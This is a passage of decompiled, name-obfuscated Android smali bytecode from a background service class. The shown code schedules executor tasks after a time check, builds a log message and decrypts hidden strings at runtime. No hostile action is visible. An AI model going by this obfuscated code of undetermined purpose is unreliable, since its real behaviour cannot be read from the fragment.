    invoke-virtual {p2}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->aklt()Z

    .line 443
    .line 444
    .line 445
    move-result v0

    .line 446
    if-nez v0, :cond_1f

    .line 447
    .line 448
    iget-object v0, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 449
    .line 450
    invoke-static {v0}, Lz/hf;->ccuvjvbsoz(Lz/hf;)Z

    .line 451
    .line 452
    .line 453
    move-result v0

    .line 454
    if-eqz v0, :cond_1d

    .line 455
    .line 456
    goto :goto_6

    .line 457
    :cond_1d
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 458
    .line 459
    .line 460
    move-result-wide p1

    .line 461
    iget-object v0, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 462
    .line 463
    invoke-static {v0}, Lz/hf;->bvkuyawo(Lz/hf;)J

    .line 464
    .line 465
    .line 466
    move-result-wide v0

    .line 467
    sub-long v0, p1, v0

    .line 468
    .line 469
    iget-object v2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 470
    .line 471
    invoke-static {v2}, Lz/hf;->bypu(Lz/hf;)J

    .line 472
    .line 473
    .line 474
    move-result-wide v2

    .line 475
    cmp-long v0, v0, v2

    .line 476
    .line 477
    if-gez v0, :cond_1e

    .line 478
    .line 479
    :goto_5
    return-void

    .line 480
    :cond_1e
    iget-object v0, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 481
    .line 482
    invoke-static {v0, p1, p2}, Lz/hf;->ckyvpul(Lz/hf;J)V

    .line 483
    .line 484
    .line 485
    iget-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 486
    .line 487
    invoke-static {p1}, Lz/hf;->bfbyn(Lz/hf;)Ljava/util/concurrent/ExecutorService;

    .line 488
    .line 489
    .line 490
    move-result-object p1

    .line 491
    iget-object p2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 492
    .line 493
    new-instance v0, Lz/ef;

    .line 494
    .line 495
    const/4 v1, 0x6

    .line 496
    invoke-direct {v0, p2, v1}, Lz/ef;-><init>(Lz/hf;I)V

    .line 497
    .line 498
    .line 499
    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    .line 500
    .line 501
    .line 502
    return-void

    .line 503
    :cond_1f
    :goto_6
    invoke-virtual {p2}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->aklt()Z

    .line 504
    .line 505
    .line 506
    move-result p2

    .line 507
    iget-object v0, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 508
    .line 509
    invoke-static {v0}, Lz/hf;->ccuvjvbsoz(Lz/hf;)Z

    .line 510
    .line 511
    .line 512
    move-result v0

    .line 513
    new-instance v1, Ljava/lang/StringBuilder;

    .line 514
    .line 515
    invoke-direct {v1, p1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 516
    .line 517
    .line 518
    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 519
    .line 520
    .line 521
    const-string p1, " disk="

    .line 522
    .line 523
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 524
    .line 525
    .line 526
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 527
    .line 528
    .line 529
    const-string p1, ")"

    .line 530
    .line 531
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 532
    .line 533
    .line 534
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 535
    .line 536
    .line 537
    move-result-object p1

    .line 538
    invoke-virtual {v3, p1}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 539
    .line 540
    .line 541
    return-void

    .line 542
    :cond_20
    iget-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 543
    .line 544
    invoke-static {p1}, Lz/hf;->bfbyn(Lz/hf;)Ljava/util/concurrent/ExecutorService;

    .line 545
    .line 546
    .line 547
    move-result-object p1

    .line 548
    iget-object p2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 549
    .line 550
    new-instance v0, Lz/ef;

    .line 551
    .line 552
    const/4 v1, 0x7

    .line 553
    invoke-direct {v0, p2, v1}, Lz/ef;-><init>(Lz/hf;I)V

    .line 554
    .line 555
    .line 556
    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 557
    .line 558
    .line 559
    return-void

    .line 560
    :goto_7
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 561
    .line 562
    const-string/jumbo v0, "dy7A8314Shcsbfm6CHE6XB4coahvGxoB\n"

    .line 563
    .line 564
    .line 565
    const-string/jumbo v1, "kopEFO3+ork=\n"

    .line 566
    .line 567
    .line 568
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 569
    .line 570
    .line 571
    move-result-object v0

    .line 572
    invoke-virtual {p2, v0, p1}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 573
    .line 574
    .line 575
    return-void
.end method
